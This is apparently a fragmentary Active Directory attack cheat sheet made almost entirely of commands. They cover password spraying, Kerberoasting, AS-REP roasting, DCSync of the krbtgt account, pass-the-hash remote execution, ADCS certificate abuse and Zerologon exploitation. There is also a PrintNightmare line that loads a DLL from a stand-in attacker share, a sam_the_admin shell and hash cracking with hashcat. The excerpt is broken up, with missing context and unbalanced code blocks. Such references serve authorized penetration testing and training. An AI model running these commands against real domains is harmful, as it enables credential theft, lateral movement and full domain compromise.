...
```bash
# Detect clock skew
nmap -sT ${PRIVATE_IP} -p445 --script smb2-time
...
bloodhound-python -u 'user' -p 'password' -d domain.local -ns ${PRIVATE_IP} -c all
```
...
```bash
# Using kerbrute
./kerbrute passwordspray -d domain.local --dc ${PRIVATE_IP} users.txt Password123

# Using CrackMapExec
crackmapexec smb ${PRIVATE_IP} -u users.txt -p 'Password123' --continue-on-success
```
...
```bash
# Impacket
GetUserSPNs.py domain.local/user:password -dc-ip ${PRIVATE_IP} -request -outputfile hashes.txt

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# CrackMapExec
crackmapexec ldap ${PRIVATE_IP} -u user -p password --kerberoast output.txt
...
```bash
# Impacket
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip ${PRIVATE_IP} -format hashcat
...
```bash
# Impacket
secretsdump.py domain.local/admin:password@${PRIVATE_IP} -just-dc-user krbtgt
...
```bash
# Impacket
psexec.py domain.local/Administrator@${PRIVATE_IP} -hashes :NTHASH
wmiexec.py domain.local/Administrator@${PRIVATE_IP} -hashes :NTHASH
smbexec.py domain.local/Administrator@${PRIVATE_IP} -hashes :NTHASH

# CrackMapExec
crackmapexec smb ${PRIVATE_IP} -u Administrator -H NTHASH -d domain.local
crackmapexec smb ${PRIVATE_IP} -u Administrator -H NTHASH --local-auth
```
...
```bash
crackmapexec smb ${PRIVATE_IP}/24 --gen-relay-list targets.txt
```
...
certipy find -u user@domain.local -p password -dc-ip ${PRIVATE_IP}
...
certipy auth -pfx administrator.pfx -dc-ip ${PRIVATE_IP}
```
...
```bash
# Check vulnerability
crackmapexec smb ${PRIVATE_IP} -u '' -p '' -M zerologon

# Exploit
python3 cve-2020-1472-exploit.py DC01 ${PRIVATE_IP}

# Extract hashes
secretsdump.py -just-dc domain.local/DC01\$@${PRIVATE_IP} -no-pass

# Restore password (important!)
python3 restorepassword.py domain.local/DC01@DC01 -target-ip ${PRIVATE_IP} -hexpass HEXPASSWORD
```
...
rpcdump.py @${PRIVATE_IP} | grep 'MS-RPRN'

# Exploit (requires hosting malicious DLL)
python3 CVE-2021-1675.py domain.local/user:pass@${PRIVATE_IP} '\\attacker\share\evil.dll'
```
...
python3 sam_the_admin.py "domain.local/user:password" -dc-ip ${PRIVATE_IP} -shell
```
...
GetUserSPNs.py domain.local/lowpriv:password -dc-ip ${PRIVATE_IP}

# 2. Request TGS tickets
GetUserSPNs.py domain.local/lowpriv:password -dc-ip ${PRIVATE_IP} -request -outputfile tgs.txt

# 3. Crack tickets
hashcat -m 13100 tgs.txt rockyou.txt

# 4. Use cracked service account
psexec.py domain.local/svc_admin:CrackedPassword@${PRIVATE_IP}
```
...
python3 printerbug.py domain.local/user:pass@target ${PRIVATE_IP}
